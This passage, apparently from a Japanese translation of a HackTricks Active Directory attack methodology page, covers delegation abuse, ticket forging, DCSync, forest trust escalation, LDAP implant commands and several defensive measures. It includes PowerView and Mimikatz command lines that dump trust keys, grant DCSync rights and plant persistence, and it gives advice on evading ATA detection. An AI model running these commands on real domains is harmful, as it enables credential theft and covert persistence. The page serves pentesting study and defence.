{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) 属性を持つ Computer object を見つけ、かつその computer に対する domain privileges を持っている場合、その computer に login するすべての users の TGTs を memory から dump できます。\
そのため、**Domain Admin がその computer に login** した場合、その TGT を dump し、[Pass the Ticket](pass-the-ticket.md) を使用して impersonate できます。\
constrained delegation により、**Print Server を自動的に compromise** することさえ可能です（できれば DC であることが望ましいです）。


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

ユーザーまたは computer が "Constrained Delegation" を許可されている場合、**computer 上の一部の services に access するために任意の user を impersonate** できます。\
その後、この user/computer の **hash を compromise** できれば、**任意の user**（domain admins を含む）を **impersonate** して一部の services に access できます。


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

リモート computer の Active Directory object に対する **WRITE** privilege を持つと、**elevated privileges** で code execution を実現できます:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

compromised user は、いくつかの domain objects に対して **interesting privileges** を持っている可能性があり、それによって laterally **move** したり privileges を **escalate** したりできます。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

domain 内で **Spool service listening** を発見すると、それを **abuse** して **新しい credentials を acquire** し、**privileges を escalate** できる可能性があります。


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**other users** が **compromised machine** に **access** すると、memory から credentials を **gather** したり、processes に beacons を **inject** して users を impersonate したりできる可能性があります。\
通常、users は RDP 経由で system に access するため、ここでは third party RDP sessions に対していくつかの attacks を実行する方法を示します:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** は、domain-joined computers 上の **local Administrator password** を管理する system を提供し、password を **randomized**、unique、かつ頻繁に **changed** される状態にします。これらの passwords は Active Directory に保存され、access は authorized users のみに ACL で制御されます。これらの passwords に access する十分な permissions があれば、他の computers への pivoting が可能になります。


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

compromised machine から **certificates を gather** することは、environment 内で privileges を escalate する方法になり得ます:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**vulnerable templates** が configured されている場合、それらを abuse して privileges を escalate できる可能性があります:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

**Domain Admin**、またはさらに望ましい **Enterprise Admin** privileges を取得すると、**domain database**: _ntds.dit_ を **dump** できます。

[**DCSync attack の詳細はこちら**](dcsync.md) にあります。

[**NTDS.dit を steal する方法の詳細はこちら**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md) にあります。

### Privesc as Persistence

前述した techniques の一部は persistence に使用できます。\
例えば、以下を実行できます:

- users を [**Kerberoast**](kerberoast.md) に vulnerable にする

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- users を [**ASREPRoast**](asreproast.md) に vulnerable にする

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- user に [**DCSync**](#dcsync) privileges を grant する

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** は、**NTLM hash**（例えば **PC account の hash**）を使用して、特定の service 用の **legitimate Ticket Granting Service (TGS) ticket** を作成します。この method は、**service privileges に access** するために使用されます。


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** では、attacker が Active Directory (AD) environment 内の **krbtgt account の NTLM hash** に access します。この account は、AD network 内での authentication に不可欠な、すべての **Ticket Granting Tickets (TGTs)** の sign に使用される特別な account です。

この hash を取得すると、attacker は任意の account 用の **TGTs** を作成できます（Silver ticket attack）。


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

これは、**common golden tickets detection mechanisms を bypass** する方法で forge された golden tickets のようなものです。


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**account の certificates を持っている、またはそれらを request できること**は、user が password を変更した場合でも、その account に persistence するための非常に有効な方法です:


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**certificates を使用して domain 内で high privileges を保持する**ことも可能です:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory の **AdminSDHolder** object は、**privileged groups**（Domain Admins や Enterprise Admins など）全体に標準の **Access Control List (ACL)** を適用し、unauthorized changes を防止することで、これらの groups の security を確保します。しかし、この feature は exploit 可能です。attacker が AdminSDHolder の ACL を変更して regular user に full access を与えると、その user はすべての privileged groups を広範に control できるようになります。この security measure は、厳密に monitor されていない場合、保護するどころか逆に unwarranted access を許してしまう可能性があります。

[**AdminDSHolder Group の詳細はこちら。**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

すべての **Domain Controller (DC)** 内には、**local administrator** account が存在します。そのような machine 上で admin rights を取得すると、**mimikatz** を使用して local Administrator hash を extract できます。その後、registry modification を行って **この password の使用を enable** する必要があり、local Administrator account への remote access が可能になります。


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

特定の domain objects に対して **user** に **special permissions** を **give** すると、その user が将来 **privileges を escalate** できるようになります。


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** は、ある **object** が別の **object** に対して持つ **permissions** を **store** するために使用されます。object の **security descriptor** に **little change** を加えるだけで、privileged group の member になる必要なく、その object に対する非常に興味深い privileges を取得できます。


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` auxiliary class を abuse して、`entryTTL`/`msDS-Entry-Time-To-Die` を持つ短命な principals/GPOs/DNS records を作成します。これらは tombstones を残さず self-delete し、LDAP evidence を消去する一方で、orphan SIDs、broken `gPLink` references、cached DNS responses（例: AdminSDHolder ACE pollution や malicious `gPCFileSysPath`/AD-integrated DNS redirects）を残します。

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

memory 内の **LSASS** を alter して **universal password** を確立し、すべての domain accounts への access を許可します。


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP (Security Support Provider) とは何かはこちらで確認できます。](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
独自の **SSP** を作成し、machine への access に使用される **credentials** を **clear text** で **capture** できます。


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD に **new Domain Controller** を register し、それを使用して指定した objects に **attributes**（SIDHistory、SPNs など）を **push** します。この際、**modifications** に関する **logs** を残しません。**DA** privileges が必要で、**root domain** 内にいる必要があります。\
誤った data を使用すると、非常に目立つ logs が生成されることに注意してください。


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

以前、**LAPS passwords を read する十分な permission** がある場合に privileges を escalate する方法について説明しました。しかし、これらの passwords は persistence の **maintain** にも使用できます。\
以下を確認してください:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft は **Forest** を security boundary とみなしています。これは、**single domain を compromise すると entire Forest が compromise される可能性がある**ことを意味します。<sup>[[1]](#references)</sup>

### Basic Information

[**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) は、ある **domain** の user が別の **domain** の resources に access できるようにする security mechanism です。これは、2 つの domains の authentication systems 間に linkage を作成し、authentication verifications が seamless に flow できるようにします。domains が trust を setup すると、trust の integrity に不可欠な特定の **keys** を交換し、**Domain Controllers (DCs)** 内に保持します。

一般的な scenario では、user が **trusted domain** 内の service に access しようとする場合、まず自身の domain の DC から **inter-realm TGT** と呼ばれる special ticket を request する必要があります。この TGT は、両 domains が合意した shared **key** で encrypted されます。次に user はこの TGT を **trusted domain の DC** に提示し、service ticket（**TGS**）を取得します。trusted domain の DC が inter-realm TGT の validation に成功すると、TGS を発行して user に service への access を許可します。

**Steps**:

1. **Domain 1** の **client computer** が、**NTLM hash** を使用して **Domain Controller (DC1)** から **Ticket Granting Ticket (TGT)** を request することで process を開始します。
2. DC1 は client の authentication に成功すると、新しい TGT を issue します。
3. 次に client は、**Domain 2** の resources に access するために必要な **inter-realm TGT** を DC1 に request します。
4. inter-realm TGT は、two-way domain trust の一部として DC1 と DC2 が共有する **trust key** で encrypted されます。
5. client は inter-realm TGT を **Domain 2 の Domain Controller (DC2)** に渡します。
6. DC2 は shared trust key を使用して inter-realm TGT を verify し、valid であれば、client が access しようとしている Domain 2 の server 用に **Ticket Granting Service (TGS)** を issue します。
7. 最後に client はこの TGS を server に提示します。TGS は server’s account hash で encrypted されており、これによって Domain 2 の service に access できます。

### Different trusts

**trust には 1 way または 2 ways がある**ことに注意してください。2 ways の場合、両 domains は相互に trust しますが、**1 way** の trust relation では、一方の domain が **trusted**、もう一方が **trusting** domain になります。この場合、**trusted domain から trusting domain 内の resources にのみ access できます**。

Domain A が Domain B を trust する場合、A は trusting domain、B は trusted domain です。また、**Domain A** ではこれは **Outbound trust**、**Domain B** では **Inbound trust** になります。

**Different trusting relationships**

- **Parent-Child Trusts**: 同じ forest 内で一般的な setup です。child domain は parent domain と自動的に two-way transitive trust を持ちます。つまり、authentication requests は parent と child の間を seamless に flow できます。
- **Cross-link Trusts**: "shortcut trusts" とも呼ばれ、child domains 間に設定されて referral processes を高速化します。複雑な forests では、authentication referrals は通常 forest root まで上がってから target domain に下る必要があります。cross-links を作成するとこの経路が短縮され、地理的に分散した environments で特に有効です。
- **External Trusts**: 異なる、無関係な domains 間に設定され、本質的に non-transitive です。[Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) によると、external trusts は forest trust で接続されていない current forest 外の domain 内の resources に access する場合に有用です。external trusts では SID filtering により security が強化されます。
- **Tree-root Trusts**: forest root domain と新しく追加された tree root の間に自動的に確立されます。一般的ではありませんが、tree-root trusts は forest に新しい domain trees を追加する際に重要であり、unique domain name と two-way transitivity を維持できます。詳細は [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) にあります。
- **Forest Trusts**: 2 つの forest root domains 間の two-way transitive trust であり、security measures を強化するため SID filtering も適用します。
- **MIT Trusts**: non-Windows の [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains との間に確立されます。MIT trusts はより specialized で、Windows ecosystem 外の Kerberos-based systems との integration が必要な environments に対応します。

#### Other differences in **trusting relationships**

- trust relationship は **transitive**（A が B を trust し、B が C を trust する場合、A は C を trust する）または **non-transitive** にできます。
- trust relationship は **bidirectional trust**（相互に trust する）または **one-way trust**（一方だけが他方を trust する）として setup できます。

### Attack Path

1. **trusting relationships を Enumerate** する
2. いずれかの **security principal**（user/group/computer）が **other domain** の resources に **access** できるか確認します。これは ACE entries によるもの、または other domain の groups に所属していることによるものです。**domains 間の relationships** を探します（おそらくこれが trust を作成した理由です）。
1. この場合、kerberoast も別の option になる可能性があります。
3. domains 間を **pivot** できる **accounts を Compromise** します。

Attackers が別の domain の resources に access する主な mechanisms は 3 つあります:

- **Local Group Membership**: principals は、server の “Administrators” group など、machines 上の local groups に追加されることがあり、その machine に対する significant control が付与されます。
- **Foreign Domain Group Membership**: principals は foreign domain 内の groups の member になることもあります。ただし、この method の有効性は trust の性質と group の scope に依存します。
- **Access Control Lists (ACLs)**: principals は **ACL**、特に **DACL** 内の **ACEs** の entities として指定され、specific resources への access を与えられることがあります。ACLs、DACLs、ACEs の mechanics を詳しく知りたい場合、whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” は非常に有用な resource です。<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

**`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** を確認すると、domain 内の foreign security principals を見つけられます。これらは **external domain/forest** の user/group です。

**Bloodhound** または powerview を使用して確認できます:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
ドメイン信頼関係を列挙するその他の方法:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> **2つの trusted keys**があり、1つは _Child --> Parent_ 用、もう1つは _Parent_ --> _Child_ 用です。\
> 現在の domain で使用されているものは、次のコマンドで確認できます。
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection を悪用して、child/parent domain の Enterprise admin に昇格します。


{{#ref}}
sid-history-injection.md
{{#endref}}

#### 書き込み可能な Configuration NC の Exploit

Configuration Naming Context (NC) を exploit する方法を理解することは重要です。Configuration NC は、Active Directory (AD) 環境の forest 全体における configuration data の中央 repository として機能します。この data は forest 内のすべての Domain Controller (DC) に replication され、書き込み可能な DC は Configuration NC の書き込み可能な copy を保持します。これを exploit するには、**DC 上の SYSTEM privileges**が必要であり、child DC が望ましいです。

**GPO を root DC site に link する**

Configuration NC の Sites container には、AD forest 内の domain-joined computers の site に関する情報が含まれています。任意の DC 上で SYSTEM privileges を使用することで、攻撃者は GPO を root DC sites に link できます。この操作により、それらの site に適用される policies を操作し、root domain を compromise できる可能性があります。

詳しい情報については、[Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) の research を参照してください。<sup>[[12]](#references)</sup>

**forest 内の任意の gMSA を compromise する**

攻撃 vector の1つは、domain 内の privileged gMSA を target にすることです。gMSA の passwords の計算に不可欠な KDS Root key は、Configuration NC 内に保存されています。任意の DC 上で SYSTEM privileges を持つ場合、KDS Root key に access し、forest 全体に存在する任意の gMSA の passwords を計算できます。

詳細な analysis と step-by-step の guidance は、次の場所で確認できます:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

補完的な delegated MSA attack (BadSuccessor – migration attributes の abuse):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

追加の external research: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)。<sup>[[13]](#references)</sup>

**Schema change attack**

この method では、新しい privileged AD objects が作成されるまで待機する patience が必要です。SYSTEM privileges により、攻撃者は AD Schema を変更して、任意の user にすべての classes への完全な control を付与できます。これにより、新しく作成された AD objects への unauthorized access と control が可能になるおそれがあります。

詳しくは、[Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6) を参照してください。<sup>[[14]](#references)</sup>

**DA から ADCS ESC5 で EA へ**

ADCS ESC5 vulnerability は、Public Key Infrastructure (PKI) objects に対する control を利用して、forest 内の任意の user として authentication を可能にする certificate template を作成します。PKI objects は Configuration NC に存在するため、書き込み可能な child DC を compromise すると ESC5 attacks を実行できます。

詳しくは、[From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/) を参照してください。<sup>[[15]](#references)</sup> ADCS が存在しない scenarios では、[Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) で説明されているように、攻撃者は必要な components を setup できます。<sup>[[16]](#references)</sup>

### External Forest Domain - One-Way (Inbound) または bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
このシナリオでは、**あなたのドメインは外部ドメインから信頼されており**、その外部ドメインに対して**不特定の権限**を持っています。あなたのドメインの**どのプリンシパルが外部ドメインに対してどのアクセス権を持っているか**を特定し、それを悪用する必要があります。


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### 外部 Forest ドメイン - 一方向（Outbound）
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
このシナリオでは、**あなたのドメイン**が、**異なるドメイン**の principal に対して、何らかの **privileges** を**信頼**しています。

しかし、**ドメインが信頼される**と、信頼されるドメインは、**予測可能な名前**を持ち、**trusted password** をパスワードとして使用するユーザーを作成します。つまり、**trusting domain のユーザーにアクセスして trusted domain 内部へ侵入**し、列挙を行って、さらに **privileges** の昇格を試みることが可能です:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

trusted domain を compromise する別の方法は、domain trust とは**逆方向**に作成された [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) を見つけることです（これはあまり一般的ではありません）。

trusted domain を compromise する別の方法は、**trusted domain のユーザーがアクセスできる**マシン上で待機し、そのユーザーが **RDP** 経由で login するのを待つことです。その後、attacker は RDP session process に code を inject し、そこから**被害者の origin domain にアクセス**できます。\
さらに、**victim がハードドライブを mount していた**場合、attacker は **RDP session** process から、ハードドライブの **startup folder** に **backdoors** を保存できます。この technique は **RDPInception** と呼ばれます。


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Domain trust abuse mitigation

### **SID Filtering:**

- forest trusts 全体で SID history attribute を利用する attacks のリスクは、SID Filtering によって軽減されます。SID Filtering は、すべての inter-forest trusts でデフォルトで有効化されています。これは、Microsoft の見解に従い、domain ではなく forest を security boundary とみなし、intra-forest trusts は安全であるという前提に基づいています。
- ただし、注意点があります。SID filtering は applications や user access を妨げる可能性があるため、無効化されることがあります。

### **Selective Authentication:**

- inter-forest trusts では、Selective Authentication を使用することで、2つの forest のユーザーが自動的に authenticate されないようにします。代わりに、trusting domain または forest 内の domains や servers にユーザーがアクセスするには、明示的な permissions が必要です。
- これらの対策は、writable Configuration Naming Context (NC) の exploitation や trust account に対する attacks から保護するものではない点に注意してください。

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## On-Host Implants からの LDAP-based AD Abuse

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) は、bloodyAD-style の LDAP primitives を、on-host implant（例: Adaptix C2）内部だけで動作する x64 Beacon Object Files として再実装します。Operators は `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make` で pack を compile し、`ldap.axs` を load してから、beacon で `ldap <subcommand>` を実行します。すべての traffic は、LDAP (389) では signing/sealing を伴う現在の logon security context 経由で、または LDAPS (636) では自動的な certificate trust とともに流れるため、socks proxies や disk artifacts は必要ありません。<sup>[[4]](#references)</sup>

### Implant-side LDAP enumeration

- `get-users`、`get-computers`、`get-groups`、`get-usergroups`、`get-groupmembers` は、short names/OU paths を full DNs に解決し、対応する objects を dump します。
- `get-object`、`get-attribute`、`get-domaininfo` は、任意の attributes（security descriptors を含む）に加えて、`rootDSE` から forest/domain metadata を取得します。
- `get-uac`、`get-spn`、`get-delegation`、`get-rbcd` は、roasting candidates、delegation settings、既存の [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) descriptors を LDAP から直接公開します。
- `get-acl` と `get-writable --detailed` は DACL を parse して、trustees、rights (GenericAll/WriteDACL/WriteOwner/attribute writes)、inheritance を一覧表示し、ACL privilege escalation の即時の targets を提示します。
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### エスカレーションと永続化のための LDAP write primitives

- Object creation BOF（`add-user`、`add-computer`、`add-group`、`add-ou`）を使うと、OU rights が存在する場所に新しい principal や machine account を準備できる。`add-groupmember`、`set-password`、`add-attribute`、`set-attribute` は、write-property rights が見つかったターゲットを直接乗っ取る。
- `add-ace`、`set-owner`、`add-genericall`、`add-genericwrite`、`add-dcsync` などの ACL に重点を置いた command は、任意の AD object に対する WriteDACL/WriteOwner を、PowerShell/ADSI artifacts を残さずに password reset、group membership control、DCSync replication privileges へ変換する。`remove-*` counterpart は注入した ACE をクリーンアップする。

### Delegation、roasting、Kerberos abuse

- `add-spn`/`set-spn` により、侵害した user を即座に Kerberoastable にできる。`add-asreproastable`（UAC toggle）は password に触れずに、その user を AS-REP roasting の対象にする。
- Delegation macro（`add-delegation`、`set-delegation`、`add-constrained`、`add-unconstrained`、`add-rbcd`）は、beacon から `msDS-AllowedToDelegateTo`、UAC flags、または `msDS-AllowedToActOnBehalfOfOtherIdentity` を書き換える。これにより constrained/unconstrained/RBCD attack path が有効になり、remote PowerShell や RSAT が不要になる。

### sidHistory injection、OU relocation、attack surface shaping

- `add-sidhistory` は、制御下にある principal の SID history に privileged SID を注入する（[SID-History Injection](sid-history-injection.md) を参照）。これにより、LDAP/LDAPS のみで stealthy な access inheritance を実現する。
- `move-object` は computer または user の DN/OU を変更する。これにより attacker は、`set-password`、`add-groupmember`、`add-spn` を abuse する前に、delegated rights がすでに存在する OU へ asset を移動できる。
- 対象を厳密に絞った removal command（`remove-attribute`、`remove-delegation`、`remove-rbcd`、`remove-uac`、`remove-groupmember` など）により、operator が credentials または persistence を収集した後、迅速に rollback でき、telemetry を最小限に抑えられる。

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## 一般的な防御策

[**credentials の保護方法について詳しく学ぶ。**](../stealing-credentials/credentials-protections.md)

### **Credentials 保護のための防御対策**

- **Domain Admins の制限**: Domain Admins は Domain Controllers への login のみに限定し、他の host では使用しないことが推奨される。
- **Service Account の privileges**: security を維持するため、service は Domain Admin（DA）privileges で実行しない。
- **Temporal Privilege Limitation**: DA privileges が必要な task では、その duration を制限する。これは次のように実現できる: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Event ID 2889/3074/3075 を audit し、その後 DC/client で LDAP signing と LDAPS channel binding を強制して LDAP MITM/relay attempt を block する。

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Impacket activity の protocol-level fingerprinting

一般的な AD tradecraft を検出したい場合、rename された binary、service name、temporary batch file、output path など、**operator が制御できる artifact のみに依存してはならない**。[Kerberos](kerberos-authentication.md)、[NTLM](../ntlm/README.md)、SMB、LDAP、DCE/RPC、WMI traffic を legitimate な Windows client がどのように構築するかを baseline 化し、operator が `psexec.py`、`wmiexec.py`、`dcomexec.py`、`atexec.py`、`ntlmrelayx.py` を編集した後にも残る **implementation quirk** を探す。<sup>[[8]](#references)</sup>

- **High-confidence standalone candidate**（独自の baseline に対して validation を行った後）:
- `auth_context_id = 79231 + ctx_id` を使用する authenticated DCE/RPC
- `0xff` で埋められた DCE/RPC authentication padding
- raw Kerberos `AP-REQ` を SPNEGO の `mechToken` に直接配置する LDAP Kerberos bind
- ASCII に見える `ClientGuid` 値を持つ SMB2/3 negotiate request
- 非標準 namespace `//./root/cimv2` を使用する WMI `IWbemLevel1Login::NTLMLogin`
- Hardcoded Kerberos nonce value
- **Correlation/scoring feature として使用する方が適切**:
- Sparse または重複した Kerberos etype list、通常と異なる/欠落した `PA-DATA`、または native Windows と異なる TGS-REQ etype ordering
- version info がない NTLM Type 1 message、または null host name を持つ Type 3 message
- SPNEGO の代わりに DCE/RPC で運ばれる raw NTLMSSP、欠落した DCE/RPC verification trailer、または SPNEGO/Kerberos OID mismatch
- 同じ host/user/session/time window からこれらの trait が複数確認される場合、単一の弱い field よりはるかに強い
- **standalone alert ではなく enrichment として使用**:
- Default filename、output path、random service name、temporary batch name、default computer account name、tool-specific HTTP/WebDAV/RDP/MSSQL string
- これらは operator が容易に変更できるため、cross-protocol cluster が suspicious である理由を説明する用途に最適
- **Operational notes**:
- これらの signal の一部には decrypted traffic、[PCAP/Zeek parsing](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md)、ETW、または service-side visibility が必要
- alert に昇格させる前に、Samba/Linux client、appliance、legacy software に対して validation する
- baseline への confidence を高めながら、detection を enrichment -> hunting -> alerting の順に昇格させる

### **Deception Techniques の実装**

- Deception の実装では、password が expire しない、または Trusted for Delegation としてマークされているなどの feature を持つ decoy user や computer のような trap を設定する。詳細な approach には、特定の rights を持つ user の作成や、high privilege group への追加が含まれる。<sup>[[2]](#references)</sup>
- 実用的な例として、次のような tool を使用する: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Deception Techniques の deploy については、[Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception) を参照。

### **Deception の識別**

- **User Object の場合**: suspicious な indicator には、通常とは異なる ObjectSID、少ない logon、creation date、少ない bad password count などがある。
- **General Indicator**: potential decoy object の attribute を genuine object の attribute と比較することで、inconsistency を明らかにできる。[HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) のような tool は、このような deception の識別に役立つ。

### **Detection System の bypass**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: ATA detection を防ぐため、Domain Controller 上での session enumeration を避ける。
- **Ticket Impersonation**: ticket creation に **aes** key を使用すると、NTLM への downgrade を回避でき、detection を evasion できる。
- **DCSync Attack**: ATA detection を回避するため、non-Domain Controller から実行することが推奨される。Domain Controller から直接実行すると alert が trigger される。

## References

- [1] [Domain Trust を攻撃するためのガイド](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Active Directory における Deception のための Trust の偽造](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Domain Admin から Enterprise Admin へ](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – Active Directory Exploitation 用 In-Memory LDAP Toolkit](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! NTLM Hash を Wordlist として weaponize する](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket の dissecting](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Netlogon 経由で Active Directory Account を takeover する](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - CVE-2020-1472 に関連する Netlogon secure channel connection の変更を管理する方法](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [忘れられた Null Session と MS-RPC Interface をめぐる旅](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [Domain 間の security boundary としての SID filter? (Part 4) - SID filtering research の bypass](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [Domain 間の security boundary としての SID filter? (Part 5) - Golden GMSA trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [Domain 間の security boundary としての SID filter? (Part 6) - Schema change trust attack - child から parent へ](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [ESC5 を使用して DA から EA へ](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [AD CS を abuse して child domain の admin から enterprise admin へ 5 分で escalation する、その follow-up](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [ACE を袖に隠す: Active Directory DACL Backdoor の設計](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [NetExec pre2k module source](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
{{#include ../../banners/hacktricks-training.md}}
